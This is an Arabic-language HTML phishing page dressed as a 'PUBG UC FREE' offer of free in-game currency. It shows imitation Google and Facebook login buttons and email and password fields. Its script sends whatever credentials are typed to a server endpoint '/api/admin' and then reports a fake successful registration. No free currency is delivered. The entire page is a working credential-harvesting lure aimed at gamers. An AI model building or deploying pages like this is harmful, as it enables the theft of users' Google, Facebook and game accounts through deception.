<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>PUBG UC FREE</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');

* { box-sizing: border-box; margin: 0; padding: 0; }

body {
    background: url('https://mediaaws-live.almasryalyoum.com/AMAYLivePictures/portalimages/news/large/2021/03/08/1481606_0.jpg') no-repeat center center fixed; /* دي صورة شبه اللي بعتهالي */
    background-size: cover;
    font-family: 'Cairo', sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    color: white;
}

.login-card {
    background: rgba(5, 10, 25, 0.85);
    backdrop-filter: blur(15px);
    border: 2px solid #FFD700;
    border-radius: 25px;
    padding: 30px 25px;
    width: 420px;
    text-align: center;
    box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
}

.logo {
    font-size: 45px;
    font-weight: 900;
    color: #FFD700;
    text-shadow: 0 0 10px #FFD700;
    margin-bottom: 20px;
}
.logo span { color: white; }

h2 { font-size: 28px; margin-bottom: 5px; }
.subtitle { color: #ccc; font-size: 14px; margin-bottom: 25px; }

.btn {
    display: flex; align-items: center; justify-content: center;
    width: 100%; padding: 12px; border-radius: 12px;
    font-size: 16px; font-weight: bold; cursor: pointer;
    margin: 10px 0; border: none; font-family: 'Cairo';
    transition: 0.3s;
}
.btn:hover { transform: scale(1.02); }
.google-btn { background: white; color: black; }
.fb-btn { background: #1877f2; color: white; }
.btn img { width: 22px; height: 22px; margin-left: 10px; }

.divider { display: flex; align-items: center; color: #aaa; margin: 20px 0; }
.divider hr { flex: 1; border: none; border-top: 1px solid #444; }
.divider span { margin: 0 15px; }

.input-box {
    position: relative; margin: 15px 0;
}
.input-box input {
    width: 100%; padding: 14px 45px 14px 14px;
    background: #0a0f1f; border: 1px solid #FFD700;
    border-radius: 12px; color: white; font-size: 15px;
    font-family: 'Cairo';
}
.input-box input:focus { outline: none; border-color: #00e5ff; }
.input-box .icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); font-size: 18px; }

.login-btn {
    width: 100%; padding: 14px;
    background: linear-gradient(90deg, #FFD700, #FFA500);
    border: none; border-radius: 12px;
    font-size: 18px; font-weight: 900;
    color: black; cursor: pointer; margin-top: 15px;
    transition: 0.3s;
}
.login-btn:hover { box-shadow: 0 0 20px #FFD700; }

</style>
</head>
<body>
    <div class="login-card">
        <div class="logo">PUBG<br><span>UC FREE</span></div>

        <h2>تسجيل الدخول 🪖</h2>
        <p class="subtitle">سجل دخولك للوصول إلى جميع خدمات الموقع</p>

        <button class="btn google-btn" onclick="register()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c1/Google_%22G%22_logo.svg" alt="G">
            تسجيل الدخول بواسطة Google
        </button>

        <button class="btn fb-btn" onclick="register()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="f">
            تسجيل الدخول بواسطة Facebook
        </button>

        <div class="divider"><hr><span>أو</span><hr></div>

        <div class="input-box">
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <span class="icon">✉️</span>
        </div>

        <div class="input-box">
            <input type="password" id="password" placeholder="كلمة المرور">
            <span class="icon">🔒</span>
        </div>

        <button class="login-btn" onclick="register()">تسجيل الدخول ➡️</button>
    </div>

<script>
async function register() {
    const id = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    if(!id || !password){
        alert("لازم تملا الايميل والباسورد");
        return;
    }
    
    try {
        const res = await fetch('/api/admin', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({id, password})
        });

        if(res.ok) {
            alert("✅ تم التسجيل بنجاح");
            document.getElementById('email').value = "";
            document.getElementById('password').value = "";
        } else {
            alert("❌ فشل التسجيل");
        }
    } catch (e) {
        alert("خطأ في الاتصال بالسيرفر");
    }
}
</script>
</body>
</html>
